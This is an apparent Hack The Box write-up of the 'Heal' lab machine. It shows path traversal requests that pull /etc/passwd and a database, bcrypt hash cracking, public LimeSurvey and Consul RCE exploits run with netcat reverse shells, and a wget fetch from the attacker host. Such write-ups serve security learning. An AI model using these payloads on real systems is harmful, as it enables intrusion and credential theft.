# 🔬 Hack The Box — Heal Writeup

> *Hey everyone I’m tired but I’m doing the Heal machine on Hack The Box because fun…*

---

## 🔍 Initial Nmap Scan

```bash
┌──(futaba㉿FutabaLab)-[~/Downloads/htb/Heal]
└─$ nmap -sV -A 10.10.11.46  
```

```
Nmap scan report for heal.htb (10.10.11.46)
Host is up (0.26s latency).
Not shown: 998 closed tcp ports (reset)

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 68:af:80:86:6e:61:7e:bf:0b:ea:10:52:d7:7a:94:3d (ECDSA)
|_  256 52:f4:8d:f1:c7:85:b6:6f:c6:5f:b2:db:a6:17:68:ae (ED25519)

80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Heal
|_http-server-header: nginx/1.18.0 (Ubuntu)

Device type: general purpose  
Running: Linux 5.X  
OS CPE: cpe:/o:linux:linux_kernel:5  
OS details: Linux 5.0 - 5.14  
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

```bash
# Traceroute Results:
TRACEROUTE (using port 199/tcp)
HOP RTT       ADDRESS
1   254.85 ms 10.10.14.1
2   254.90 ms heal.htb (10.10.11.46)
```

📝 *OS and Service detection performed. Nmap done in 20.66 seconds.*

---

## 🕵️‍♂️ Web Enumeration

> I snooped around the website and it's a **resume builder** — nice…

- Visited: `http://heal.htb/survey`

Hmm, I wonder what this is. Clicking **"Take the survey"** takes me to:

📍 `http://take-survey.heal.htb/index.php/552933?lang=en`

### 🧠 Add to /etc/hosts
```text
10.10.11.46    heal.htb take-survey.heal.htb
```

---

## 📝 Survey Page

> Make PDF & PNG export better?

- There is **1 question** in this survey.
- This survey is **anonymous**.
- Info dump about how no identifying info is stored unless explicitly asked for.
- No input box… just a **Next** button. 🤨

### ❓ Survey Question:

> **What features can we add more to make the webapp more usable by its users?**

I answered:

> “Giving me the user and root flag :)”

Thanks, random survey site! 😄  
*Your survey responses have been recorded.*

---

# 📂 Directory & Subdomain Enumeration

---

## 🧪 Dirsearch

```bash
┌──(futaba㉿FutabaLab)-[~/Downloads/htb/Heal]
└─$ dirsearch -u http://heal.htb/ --exclude-status=301,302,403,404,500,503
````

> ⚠️ *Heads-up: dirsearch threw a deprecation warning — no big deal:*

```text
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API...
```

> 📦 Extensions used: `php`, `aspx`, `jsp`, `html`, `js`
> ⚙️ Threads: 25 | Wordlist size: 11,460

📁 Output saved to:

```
/home/futaba/Downloads/htb/Heal/reports/http_heal.htb/__25-05-17_16-59-58.txt
```

Result:

> ❌ **Nothing interesting :(**

---

### 🧠 Tip to self:

> *Whenever the website looks super barebones, it's usually a sign there’s a subdomain!*

So let’s break out the big guns: **ffuf**!

---

## 🔍 Subdomain Fuzzing (FFUF)

```bash
┌──(futaba㉿FutabaLab)-[~/Downloads/htb/Heal]
└─$ ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt \
-u http://heal.htb -H "Host: FUZZ.heal.htb" \
-mc 200 -fs 0 -t 50
```

🎯 **Targeting subdomains on `heal.htb` using a massive DNS wordlist**
💡 *Don't forget: you NEED a wordlist for this step!*

### ✅ FFUF Results

```text
api                     [Status: 200, Size: 12515, Words: 469, Lines: 91, Duration: 257ms]
```

> 🎯 We found something! `api.heal.htb` ✅

### 🛠️ Updating `/etc/hosts`

```text
(IP OF THE MACHINE)  heal.htb  api.heal.htb  take-survey.heal.htb
```

---

## 🖥️ Visiting `api.heal.htb`

Right off the bat:

```text
Rails version: 7.1.4  
Ruby version: ruby 3.3.5 (2024-09-03 revision ef084cc8f4) [x86_64-linux]
```

> 🧨 **Dead giveaway** — there might be exploits for these, since they’re exposing version info publicly.

---

## 🔎 Vulnerability Hunting

Let’s look these up using `searchsploit`.

### 🔍 Ruby 3.3.5

```bash
┌──(futaba㉿FutabaLab)-[~/Downloads/htb/Heal]
└─$ searchsploit ruby 3.3.5
```

```text
Exploit Title                                                                       | Path
------------------------------------------------------------------------------------|----------------------------
Metasploit Web UI < 4.14.1-20170828 - Cross-Site Request Forgery                   | ruby/webapps/42961.txt
```

> 🧪 *Hmm… Not directly useful for this target, but noted.*

### 🔍 Rails 7.1.4

```bash
┌──(futaba㉿FutabaLab)-[~/Downloads/htb/Heal]
└─$ searchsploit rails 7.1.4
```

```text
Exploits: No Results  
Shellcodes: No Results
```

> 🧃 *Csrf… hmm okay… we’ll keep this in the back pocket.*

```
# 📁 Exploring `api.heal.htb`

---

## 🧪 Dirsearch on `api.heal.htb`

```bash
┌──(futaba㉿FutabaLab)-[~/Downloads/htb/Heal]
└─$ dirsearch -u http://api.heal.htb/ --exclude-status=301,302,403,404,500,503
```

📁 Output saved to:
```
/home/futaba/Downloads/htb/Heal/reports/http_api.heal.htb/__25-05-17_17-05-50.txt
```

### Results

```text
401 - /download
401 - /download.php
401 - /download.html
401 - /download.js
```

> ❌ **Nothing usable here — just a bunch of protected `/download*` endpoints. Boring.**

---

## 🔁 Refocusing: Let’s try the survey site!

Navigating to `http://take-survey.heal.htb/` brings up:

```text
The following surveys are available:
Please contact Administrator (ralph@heal.htb) for further assistance.
```

> 👀 *Huh okay, **ralph@heal.htb** I see you XD*

---

## 🕸️ Crawling with Katana

> 💡 *Let’s do some more thorough endpoint discovery*

### 🔍 Crawling `heal.htb`

```bash
┌──(futaba㉿FutabaLab)-[~/Downloads/htb/Heal]
└─$ katana -u http://heal.htb -o heal.endpoints
```

Results:

```text
http://heal.htb
http://heal.htb/static/js/0.chunk.js
http://heal.htb/static/js/main.chunk.js
http://heal.htb/manifest.json
http://heal.htb/static/js/bundle.js
```

### 🔍 Looking for API endpoints

```bash
┌──(futaba㉿FutabaLab)-[~/Downloads/htb/Heal]
└─$ cat heal.endpoints | grep api.heal.htb
```

> ❌ Nothing yet... So let’s hit `api.heal.htb` directly.

---

### 🔍 Crawling `api.heal.htb`

```bash
┌──(futaba㉿FutabaLab)-[~/Downloads/htb/Heal]
└─$ katana -u http://api.heal.htb -o heal.endpoints2
```

Results:

```text
http://api.heal.htb
```

> 😑 *Yawn... Only the root. Not helpful yet.*

---

## 🔍 Dirsearch on `take-survey.heal.htb`

```bash
┌──(futaba㉿FutabaLab)-[~/Downloads/htb/Heal]
└─$ dirsearch -u http://take-survey.heal.htb/ --exclude-status=301,302,403,404,500,503
```

📁 Output saved to:
```
/home/futaba/Downloads/htb/Heal/reports/http_take-survey.heal.htb/__25-05-17_17-12-02.txt
```

### 🔥 Dirsearch Results

| Status | Size  | Endpoint                                     |
|--------|-------|----------------------------------------------|
| 200    | 114B  | `/application/`                              |
| 200    | 114B  | `/application/logs/`                         |
| 200    | 8KB   | `/gulpfile.js`                               |
| 200    | 48KB  | `/LICENSE`                                   |
| 200    | 2KB   | `/README.md`                                 |
| 200    | 255B  | `/tmp/`                                      |
| 401    | 4KB   | `/uploader`                                  |
| 401    | 4KB   | `/uploader/`                                 |
| 200    | 0B    | `/vendor/composer/autoload_classmap.php`     |
| 200    | 0B    | `/vendor/composer/autoload_namespaces.php`   |
| 200    | 0B    | `/vendor/composer/autoload_psr4.php`         |
| 200    | 0B    | `/vendor/composer/autoload_real.php`         |
| 200    | 0B    | `/vendor/composer/autoload_static.php`       |
| 200    | 0B    | `/vendor/composer/ClassLoader.php`           |

> 🔍 **Interesting paths:**
> - `/application/` and `/application/logs/` — maybe vulnerable?
> - `/tmp/` and `/uploader/` — **401 unauthorized**, but worth noting for brute-force or IDOR
> - `/vendor/composer/...` — classic Composer autoload paths, might hint at PHP app source code

---

# 🧪 Hitting a Roadblock… Until I Got Curious with Burp Suite

So yeah... I was kind of stuck 😮‍💨 Nothing juicy from dirsearch, katana, or basic crawling.  
But then I thought: **"What if I filled out that janky resume form... while intercepting with Burp?"**  

> 💡 *You’d be surprised what kind of dumb stuff gets logged or sent behind the scenes.*

---

## 📄 My "Totally Real" Resume Submission

> **Theme:** *Rio Futaba* from *Rascal Does Not Dream of Bunny Girl Senpai*  
> *(Absolutely worth watching, 10/10 introspection with some spice)*

---

### 👤 Personal Info

```text
Name: Rio Futaba  
📍 Location: Fujisawa, Kanagawa, Japan  
📧 Email: rio.futaba@gmail.com (fictional)  
📞 Phone: 123456789 (fictional)
````

---

### 🎓 Education

**Minegahara High School** — Second-Year Student
*Field of Study:* General Science
*Expected Graduation:* March 20XX

**Description:**
An academically advanced curriculum covering biology, chemistry, physics, and environmental science.
Focused on developing a scientific mindset through experimentation, analytical thinking, and interdisciplinary research.
Active in applying scientific theories to real-world and theoretical phenomena.

---

### 💼 Experience

**Science Club – Minegahara High School**
**Role:** Club President / Lead Researcher
**Duration:** April 20XX – Present

**Responsibilities:**

* Founded and managed the Science Club as the sole member.
* Conducted high-level independent research into **quantum mechanics**, **time theory**, and **psychosomatic phenomena**.
* Provided scientific consultation to peers experiencing "Adolescence Syndrome."
* Documented experimental data and presented findings in academic discussions.

**Key Projects:**

* **Adolescence Syndrome Case Studies** – Analyzed & resolved multiple metaphysical events using scientific methodology.
* **Quantum Identity Experiment** – Explored self-duplication through interaction with a parallel self.
* **Time Loop Analysis** – Helped resolve a time dislocation through hypothesis testing & observation theory.

---

### 🧠 Skills

* Advanced scientific literacy (Physics, Chemistry, Psychology)
* Critical and analytical thinking
* Experimental design & documentation
* Independent research
* Strong deductive reasoning
* Basic lab equipment handling

---

### 🌐 Languages

* Japanese – Native

---

> 😌 **Very nice if I do say so myself.**

Next up: Let’s see what this form **actually does** behind the scenes when submitted with Burp...

---
## 📤 Exporting the Resume — Now We're Cooking

So I hit the **Export** button after filling out that amazing Futaba resume... and Burp Suite immediately caught something **very spicy**.  

Here’s what I saw first:

```

OPTIONS /exports HTTP/1.1
Host: api.heal.htb
Access-Control-Request-Method: POST
Access-Control-Request-Headers: authorization,content-type
Origin: [http://heal.htb](http://heal.htb)

```

🤨 **CORS preflight?** Okay, looks like this frontend app wants to POST some data to the API. That means we’re getting close to seeing how it generates that download.

---

### 🧾 The Actual POST Request

Then comes the **big boy**:

```

POST /exports HTTP/1.1
Host: api.heal.htb
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjo3fQ.bN47YVxPM1ZVqbw4J7oHZeDc3ixY3KO6yZpM5M3nfZE
Content-Type: application/json

````

> 🔥 Boom — We’re looking at a **JWT** with a `user_id` of `7`.  
> 🔥 Even better — It’s posting raw **HTML content** inside a JSON object... to render it as a **PDF**!

---

### 🧠 What’s Being Sent?

The body of the request is literally just a massive HTML template, styled and prettied up with embedded `<style>` tags.  
It’s wrapped up like this:

```json
{
  "content": "<!DOCTYPE html> ... </html>",
  "format": "pdf"
}
````

This backend endpoint takes raw HTML + style, converts it into a PDF, and saves it.

---

### 🧪 🧱 Possible Attack Surface?

At this point, my hacker brain is screaming:

* **HTML Injection?**
* **PDF Injection / JS in PDF?**
* **Server-Side File Write Abuse?**
* **Unrestricted File Generation + Download?**

So what’s the next request?

---

### 📥 File Download Request Appears!

Right after the POST, another **OPTIONS** request hits:

```
OPTIONS /download?filename=76bc5d0a7ddc08356af8.pdf HTTP/1.1
Host: api.heal.htb
Access-Control-Request-Method: GET
Access-Control-Request-Headers: authorization
Origin: http://heal.htb
```

Then the frontend immediately GETs that file to let you download the rendered resume.

So yeah — the `/exports` endpoint:

* Accepts full HTML content.
* Converts to a `.pdf`.
* Returns a **downloadable filename**.
* Which is then pulled from `/download?filename=...`.

💡 **I now had a working JWT + filename + file generator = Interesting attack vector!**

## 🚀 Downloading the Generated PDF — The Moment of Truth

After firing off that huge POST request with the HTML resume, the client makes this request:

```http
GET /download?filename=76bc5d0a7ddc08356af8.pdf HTTP/1.1
Host: api.heal.htb
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjo3fQ.bN47YVxPM1ZVqbw4J7oHZeDc3ixY3KO6yZpM5M3nfZE
Accept-Language: en-US,en;q=0.9
Accept: application/json, text/plain, */*
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
Origin: http://heal.htb
Referer: http://heal.htb/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
```

And just like that — **the PDF downloads!** 🎉

---

## 🧐 What Happens if We Remove the Authorization?

Curious if the file download requires a valid token, I stripped out the `Authorization` header and tried again:

```http
GET /download?filename=86b3ccdf28017d02d42c.pdf HTTP/1.1
Host: api.heal.htb
Accept-Language: en-US,en;q=0.9
Accept: application/json, text/plain, */*
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
Origin: http://heal.htb
Referer: http://heal.htb/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
```

The server wasn’t having it:

```http
HTTP/1.1 401 Unauthorized
Content-Type: application/json; charset=utf-8
{"errors":"Invalid token"}
```

**Nope! Authorization is mandatory.** 😢

---

## 🎯 But Can We Download *Any* File?

The real fun began when I tested for **Path Traversal**:

```http
GET /download?filename=../../../../../etc/passwd HTTP/1.1
Host: api.heal.htb
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjo3fQ.bN47YVxPM1ZVqbw4J7oHZeDc3ixY3KO6yZpM5M3nfZE
Accept-Language: en-US,en;q=0.9
Accept: application/json, text/plain, */*
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/136.0.0.0
Origin: http://heal.htb
Referer: http://heal.htb/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
```

I had to keep adding `../` until the server finally returned:

```http
HTTP/1.1 200 OK
Content-Type: application/octet-stream
Content-Disposition: attachment; filename="passwd"
```

…and the sweet, sweet content of `/etc/passwd` streamed back:

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
...
ralph:x:1000:1000:ralph:/home/ralph:/bin/bash
ron:x:1001:1001:,,,:/home/ron:/bin/bash
postgres:x:116:123:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
```

---

## 🎉 Jackpot — Arbitrary File Download Confirmed!

The ability to download **arbitrary files** is a massive issue:

- Sensitive files like `/etc/passwd` are exposed.
- User home directories pop up (`ralph` and `ron`).
- The `postgres` user indicates a database might be installed locally.

---
## Hunting for Database Credentials

Searching for a database config file, I referred to:

* [Configuring and connecting to a database - Learn Ruby on Rails](https://academy.bigbinary.com/)
* [HTB Heal Writeups](https://htb-writeups)

Eventually, I found the crucial file:

```http
GET /download?filename=../../config/database.yml HTTP/1.1
Host: api.heal.htb
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjo3fQ.bN47YVxPM1ZVqbw4J7oHZeDc3ixY3KO6yZpM5M3nfZE
Accept: application/json, text/plain, */*
Origin: http://heal.htb
Referer: http://heal.htb/
```

**Response:**

```yaml
default: &default
  adapter: sqlite3
  pool: <%= ENV.fetch("RAILS_MAX_THREADS") { 5 } %>
  timeout: 5000

development:
  <<: *default
  database: storage/development.sqlite3

test:
  <<: *default
  database: storage/test.sqlite3

production:
  <<: *default
  database: storage/development.sqlite3
```

---

## Downloading the SQLite Database

Using the discovered path, we fetch the database file:

```http
GET /download?filename=../../storage/development.sqlite3 HTTP/1.1
Host: api.heal.htb
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjo3fQ.bN47YVxPM1ZVqbw4J7oHZeDc3ixY3KO6yZpM5M3nfZE
```

---

## Extracting User Credentials from Database

After inspecting the DB, I found user records containing emails and bcrypt hashed passwords:

| Email                                               | Password Hash                                                    | User   |
| --------------------------------------------------- | ---------------------------------------------------------------- | ------ |
| [rio.futaba@gmail.com](mailto:rio.futaba@gmail.com) | \$2a\$12\$w9n.LGgqxqxvaoGzW59C5umIu5.0J1qG/d2lJIS6nQKDqey4mtE2G2 | Futaba |
| [aererg@hacker.com](mailto:aererg@hacker.com)       | \$2a\$12\$GSa08pbnl/WyjLEJCkOIMulJafi7qBeYgwdslFOUl5T0eP5UJJHcK  | Aererg |
| [vantascure@heal.htb](mailto:vantascure@heal.htb)   | \$2a\$12\$J26BZVlMLw\.5DyIWQkJOquoAdTNJ//pqByWOxbSVvF9ebDGOBghA2 | Vantas |
| [admin@htb.com](mailto:admin@htb.com)               | \$2a\$12\$OF7cQ4INjQWRfLJ3FFcc9ea2Rtaoy/DFX0e4VokaB.eAlPnb0l4qe  | Admin  |
| [ralph@heal.htb](mailto:ralph@heal.htb)             | \$2a\$12\$dUZ/O7KJT3.zE4TOK8p4RuxH3t.Bz45DSr7A94VLvY9SWx1GCSZnG  | Ralph  |

---

## Cracking Ralph's Password

Using `hashcat` with mode `3200` (bcrypt) and the famous rockyou.txt wordlist:

```bash
hashcat -m 3200 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
```

After cracking:

```bash
hashcat --show -m 3200 hashes.txt
$2a$12$dUZ/O7KJT3.zE4TOK8p4RuxH3t.Bz45DSr7A94VLvY9SWx1GCSZnG:147258369
```

**Ralph's password:** `147258369`

---
# Limesurvey Authenticated RCE Exploit Walkthrough

---

## Step 1: Initial Login

Head over to the admin login page:

[http://take-survey.heal.htb/index.php/admin/authentication/sa/login](http://take-survey.heal.htb/index.php/admin/authentication/sa/login)

Login with:

- **Username:** `ralph`
- **Password:** `147258369`

---

## Step 2: Using the Authenticated RCE Exploit

I found a ready-made Authenticated Remote Code Execution (RCE) exploit for Limesurvey — full credit goes to the original authors!

- GitHub repo: [Y1LD1R1M-1337/Limesurvey-RCE](https://github.com/Y1LD1R1M-1337/Limesurvey-RCE/blob/main/exploit.py)
- Required files: `Y1LD1R1M.zip` and `php-rev.php` (must be in the same directory)
- **Important:** Modify `php-rev.php` to include your IP and port for the reverse shell

Run the exploit like this:

```bash
python3 exploit.py http://take-survey.heal.htb ralph 147258369 80
```

Sample output:

```
_______________LimeSurvey RCE_______________

Usage: python exploit.py URL username password port
Example: python exploit.py http://192.26.26.128 admin password 80

[+] Retrieving CSRF token...
[+] Sending Login Request...
[+] Login Successful
[+] Upload Plugin Request...
[+] Plugin Uploaded Successfully
[+] Install Plugin Request...
[+] Plugin Installed Successfully
[+] Activate Plugin Request...
[+] Plugin Activated Successfully
[+] Reverse Shell Starting, Check Your Connection :)
```

Then open a listener:

```bash
nc -lvnp 1234
```

---

## Step 3: Troubleshooting Compatibility Issues

**Problem:** Uploading the plugin manually gave an error:

> _The plugin is not compatible with your version of LimeSurvey._

This likely means the exploit was targeting a different version.

---

## Step 4: Using the Exploit for LimeSurvey 6.6.4

Found a better-suited exploit for **LimeSurvey 6.6.4** here:

- GitHub: [N4s1rl1/Limesurvey-6.6.4-RCE](https://github.com/N4s1rl1/Limesurvey-6.6.4-RCE)
- Guide: [Medium writeup](https://nasirli.medium.com/limesurvey-6-6-4-rce-0a54c2c09c5e)

### Setup

```bash
git clone https://github.com/N4s1rl1/Limesurvey-6.6.4-RCE.git
cd Limesurvey-6.6.4-RCE
zip -r N4s1rl1.zip config.xml revshell.php
pip install -r requirements.txt
```

### Important!

**Edit `revshell.php`** to insert your IP and port **before** zipping the plugin:

```php
// Example inside revshell.php
$ip = 'YOUR IP HERE';
$port = YOUR PORT HERE;
```

---

## Step 5: Virtual Environment and Dependencies

```bash
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt
```

---

## Step 6: Running the Exploit

```bash
python3 exploit.py http://take-survey.heal.htb ralph 147258369 80
```

Sample output:

```
 _   _ _  _  ____  _ ____  _     _
| \ | | || |/ ___|/ |  _ \| |   / |
|  \| | || |\___ \| | |_) | |   | |
| |\  |__   _|__) | |  _ <| |___| |
|_| \_|  |_||____/|_|_| \_\_____|_|

[INFO] Retrieving CSRF token for login...
[SUCCESS] Login Successful!
[INFO] Uploading Plugin...
[SUCCESS] Plugin Uploaded Successfully!
[INFO] Installing Plugin...
[SUCCESS] Plugin Installed Successfully!
[INFO] Activating Plugin...
[SUCCESS] Plugin Activated Successfully!
[INFO] Triggering Reverse Shell...
[SUCCESS] Reverse Shell Started! Check your listener.
```

---

## Step 7: Getting the Reverse Shell

Listen for the shell connection:

```bash
nc -lvnp 1234
```

Once connected, commands like:

```bash
whoami
ls
```

should work, and you'll see:

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
---
# Initial Recon & Attempted Navigation

```bash
$ cd home
$ ls
ralph
ron

$ cd ralph
/bin/sh: 7: cd: can't cd to ralph

$ cd ron
/bin/sh: 8: cd: can't cd to ron

$ ls ralph
ls: cannot open directory 'ralph': Permission denied
```

> **Note:** Both user directories exist but are inaccessible due to permissions.

---

# Trying to Use `sudo`

```bash
$ sudo -l
sudo: a terminal is required to read the password; either use the -S option to read from standard input or configure an askpass helper
sudo: a password is required
```

> **Ouch!** No `sudo` without a password and no terminal to prompt for it. Time to escalate another way.

---

# Introducing linPEAS — the Privilege Escalation Automation Tool

Started a simple HTTP server on attacker machine to host linPEAS:

```bash
┌──(futaba㉿FutabaLab)-[~/Downloads/htb/Heal]
└─$ python3 -m http.server 8000 
```

Attempted to download linPEAS on target but failed due to permissions in current directory:

```bash
$ wget http://10.10.14.31:8000/linpeas.sh
linpeas.sh: Permission denied
Cannot write to 'linpeas.sh' (Permission denied).
```

Switched to `/tmp` (world writable) and retried:

```bash
$ cd /tmp
$ wget http://10.10.14.31:8000/linpeas.sh
```

Download succeeded!

---

# Making linPEAS Executable and Running It

```bash
$ chmod +x linpeas.sh
$ ./linpeas.sh
```

### linPEAS Output Snippet (Password Hunting)

```
╔══════════╣ Searching passwords in config PHP files
...
/var/www/limesurvey/application/config/config.php:                      'password' => 'AdmiDi0_pA$$w0rd',
```

---

# Jackpot! Found Password in PHP Config File

* **Password:** `AdmiDi0_pA$$w0rd`
* Possible users to try: `ron`, `ralph`

---

# SSH Login as ron

```bash
┌──(futaba㉿FutabaLab)-[~/Downloads/htb/Heal]
└─$ ssh ron@heal.htb
```

First-time SSH host key prompt — accepted it:

```
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
```

Password prompt — used `AdmiDi0_pA$$w0rd` and successfully logged in:

```
ron@heal.htb's password: 
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-126-generic x86_64)
...
ron@heal:~$ 
```

---

# 🎉 WE'RE IN! Access as `ron` gained!

---

# 🧑‍💻 Access as `ron` User

```bash
ron@heal:~$ sudo -l
[sudo] password for ron: 
Sorry, user ron may not run sudo on heal.
```

> No sudo privileges for `ron`. Let's see what we *can* do.

---

# 🏠 Exploring ron’s Home Directory

```bash
ron@heal:~$ cd /home/ron
ron@heal:~$ ls
user.txt
ron@heal:~$ cat user.txt
67b6cab0c780defd94401a3e77b1e1ae
```

> User flag captured! Now, let's investigate running services and ports.

---

# 🔍 Checking Active Ports (from linPEAS & HackTricks)

```text
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:3001          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:8500          0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:80              0.0.0.0:*               994/nginx: worker p
tcp6       0      0 :::22                   :::*                    LISTEN      -
```

> Notice **port 8500** listening only on localhost — looks interesting.

---

# 🔌 SSH Tunnel to Forward Port 8500

```bash
┌──(futaba㉿FutabaLab)-[~/…/htb/Heal/rev/Limesurvey-6.6.4-RCE]
└─$ sshpass -p 'AdmiDi0_pA$$w0rd' ssh ron@heal.htb -L 8500:127.0.0.1:8500
```

> We forward the local port `8500` to the target’s localhost:8500.

---

# 🌐 Accessing the Service Locally

Navigate to:

```
http://localhost:8500/ui/server1/services
```

You find a **Consul UI** with several services registered:

* gato
* consul
* Heal React APP
* PostgreSQL
* Ruby API service

---

# 🕵️‍♂️ Investigating the `gato` Service

Consul shows:

* Service check failing with connection timeout:

  ```
  /bin/bash: connect: Connection timed out
  /bin/bash: line 1: /dev/tcp/10.10.14.72/9001: Connection timed out
  ```

---

# 🚨 Found Vulnerability: Consul v1.19.2 RCE

**Exploit details:**

* **EDB ID:** 51117
* **Author:** GatoGamer1155
* **Type:** Remote Command Execution
* **Date:** 2023-03-28

*Consul versions <= v1.19.2 are vulnerable to this RCE.*

---

# ⚔️ Running the Exploit

```bash
┌──(futaba㉿FutabaLab)-[~/Downloads/htb/Heal/priv esc]
└─$ python3 exploit.py 127.0.0.1 8500 10.10.14.31 727 0

[+] Request sent successfully, check your listener
```

Start netcat listener:

```bash
┌──(futaba㉿FutabaLab)-[~/Downloads/htb/Heal/priv esc]
└─$ nc -lvnp 727
listening on [any] 727 ...
connect to [10.10.14.31] from (UNKNOWN) [10.10.11.46] 45866
bash: cannot set terminal process group (56144): Inappropriate ioctl for device
bash: no job control in this shell
root@heal:/# cat /root/root.txt
6c33d025ee42ecf644bafadc0ded7b3e
```

---

# 🎯 Root Flag Captured!

---

# 📝 Final Thoughts

Holy shit, this took way too long but we got root! Thanks for reading y’all! 🚀🔥

---
